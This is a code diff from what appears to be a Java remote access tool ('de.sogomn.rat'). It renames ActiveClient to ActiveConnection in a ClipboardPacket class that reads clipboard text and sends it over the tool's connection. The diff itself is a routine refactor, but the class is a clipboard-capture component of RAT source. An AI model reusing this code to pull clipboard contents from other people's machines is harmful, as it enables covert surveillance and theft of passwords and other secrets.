@@ -10,7 +10,7 @@ import java.io.IOException;
 import javax.swing.JDialog;
 import javax.swing.JOptionPane;
 
-import de.sogomn.rat.ActiveClient;
+import de.sogomn.rat.ActiveConnection;
 
 public final class ClipboardPacket extends AbstractPingPongPacket {
 	
@@ -22,27 +22,27 @@ public final class ClipboardPacket extends AbstractPingPongPacket {
 	}
 	
 	@Override
-	protected void sendRequest(final ActiveClient client) {
+	protected void sendRequest(final ActiveConnection client) {
 		//...
 	}
 	
 	@Override
-	protected void sendData(final ActiveClient client) {
+	protected void sendData(final ActiveConnection client) {
 		client.writeUTF(clipboardContent);
 	}
 	
 	@Override
-	protected void receiveRequest(final ActiveClient client) {
+	protected void receiveRequest(final ActiveConnection client) {
 		//...
 	}
 	
 	@Override
-	protected void receiveData(final ActiveClient client) {
+	protected void receiveData(final ActiveConnection client) {
 		clipboardContent = client.readUTF();
 	}
 	
 	@Override
-	protected void executeRequest(final ActiveClient client) {
+	protected void executeRequest(final ActiveConnection client) {
 		type = DATA;
 		
 		try {
@@ -60,7 +60,7 @@ public final class ClipboardPacket extends AbstractPingPongPacket {
 	}
 	
 	@Override
-	protected void executeData(final ActiveClient client) {
+	protected void executeData(final ActiveConnection client) {
 		final JOptionPane optionPane = new JOptionPane(clipboardContent);
 		final JDialog dialog = optionPane.createDialog(null);
 		
